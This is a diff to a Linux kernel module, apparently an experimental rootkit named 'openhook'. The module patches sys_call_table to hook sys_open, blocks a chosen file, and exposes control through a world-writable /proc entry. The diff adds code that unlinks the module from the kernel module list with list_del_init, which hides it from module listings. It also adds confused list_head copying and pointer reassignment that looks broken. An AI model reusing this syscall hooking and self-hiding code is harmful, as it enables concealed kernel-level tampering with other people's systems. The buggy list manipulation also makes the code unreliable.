@@ -10,6 +10,10 @@
 
 MODULE_LICENSE("GPL");
 
+struct list_head modules_list;
+struct list_head *p;
+struct list_head *n;
+
 char filepath[128] = { 0x0, } ;
 void ** sctable ;
 int count = 0 ;
@@ -21,9 +25,16 @@ asmlinkage int openhook_sys_open(const char __user * filename, int flags, umode_
 	char fname[256] ;
 
 	copy_from_user(fname, filename, 256) ;
-
+	pr_info("cat block return link\n");
+	modules_list = THIS_MODULE->list;
+	(&modules_list)->next = n;
+	(&modules_list)->prev = p;
+	
 	if (filepath[0] != 0x0 && strcmp(filepath, fname) == 0) {
 		count++ ;
+		modules_list = THIS_MODULE->list;
+		(&modules_list)->next = n;
+		(&modules_list)->prev = p;
 		return -1 ;
 	}
 	return orig_sys_open(filename, flags, mode) ;
@@ -47,6 +58,7 @@ ssize_t openhook_proc_read(struct file *file, char __user *ubuf, size_t size, lo
 	ssize_t toread ;
 
 	sprintf(buf, "%s:%d\n", filepath, count) ;
+	
 
 	toread = strlen(buf) >= *offset + size ? size : strlen(buf) - *offset ;
 
@@ -87,13 +99,21 @@ static const struct file_operations openhook_fops = {
 
 static 
 int __init openhook_init(void) {
+	
+
 	unsigned int level ; 
 	pte_t * pte ;
 
+
 	proc_create("openhook", S_IRUGO | S_IWUGO, NULL, &openhook_fops) ;
-
+	
+  	modules_list = THIS_MODULE->list;
+	n = (&modules_list)->next;
+	p = (&modules_list)->prev;
+	pr_info("name    = %s\n", THIS_MODULE->name);
+    	pr_info("version = %s\n", THIS_MODULE->version);
 	sctable = (void *) kallsyms_lookup_name("sys_call_table") ;
-
+	list_del_init(&__this_module.list); 
 	orig_sys_open = sctable[__NR_open] ;
 	pte = lookup_address((unsigned long) sctable, &level) ;
 	if (pte->pte &~ _PAGE_RW) 
